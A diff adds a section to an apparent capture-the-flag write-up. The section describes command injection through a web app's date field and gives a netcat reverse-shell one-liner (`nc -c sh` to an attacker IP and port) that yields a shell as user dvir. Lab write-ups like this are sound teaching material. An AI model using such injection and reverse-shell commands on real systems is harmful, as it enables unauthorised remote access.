@@ -106,3 +106,14 @@ The newly revealed cookie was inserted, and the /dashboard page was successfully
 
 In the browser, nothing could be modified, but the date field was the only parameter that accepted user input in Burp Suite. Appending the Linux command `id` to the date field caused the server to respond with the output of the `id` command.
 
+---
+# Shell as dvir
+
+<img width="509" height="381" alt="image" src="https://github.com/user-attachments/assets/3e7bfcb6-6179-4de9-a85f-45f14fe08fe9" />
+
+<img width="250" height="42" alt="image" src="https://github.com/user-attachments/assets/1a79f800-5e55-4e7c-9ff7-8fa313b195eb" />
+
+```
+nc -c sh 10.10.14.107 4444
+```
+The command was inserted into the date field and reverse shell as user dvir retrieved.
